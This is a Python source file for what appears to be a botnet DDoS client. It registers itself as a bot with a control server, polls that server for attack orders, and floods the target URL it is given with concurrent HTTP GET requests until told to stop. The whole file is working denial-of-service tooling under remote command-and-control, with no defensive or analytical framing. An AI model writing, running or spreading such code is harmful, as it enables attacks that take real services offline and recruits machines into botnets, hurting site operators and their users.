import os
import time
import asyncio
import aiohttp
from loguru import logger
from modules.connection import *


# Const
root_folder = os.path.dirname(os.path.abspath(__file__))

# Initialization
server = Server()
logger.info('Initialization...')


def get_logged():
    with open(f'{root_folder}/logged', 'r') as file:
        output = bool(file.read)
        file.close()
    return output


def set_logged(is_logged):
    with open(f'{root_folder}/logged', 'w') as file:
        file.write(str(is_logged))
        file.close()


async def send_request(url):
    while server.is_attack()['start']:
        try:
            async with session.get(url) as resp:
                if resp.status != 200:
                    logger.error(f'Server error: {resp.status}')
                else:
                    logger.success(f'Packet send')
        except aiohttp.client_exceptions.ServerTimeoutError:
            logger.warning('Time out')
    logger.warning('Attack stoped')


async def main(url, concurrency):
    timeout = 5
    global session
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(timeout)
    )

    tasks = [
        send_request(url)
        for i
        in range(concurrency)
    ]
    await asyncio.gather(*tasks)


if __name__ == '__main__':
    global is_attack
    if get_logged():
        pass
    else:
        server.login_as_bot()
        set_logged(True)
    while True:
        config = server.is_attack()
        is_attack = config['start']
        if config['start']:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(
                main(config['target'], config['threads']))
        logger.debug(f'Attack status: {config}')
        time.sleep(4)
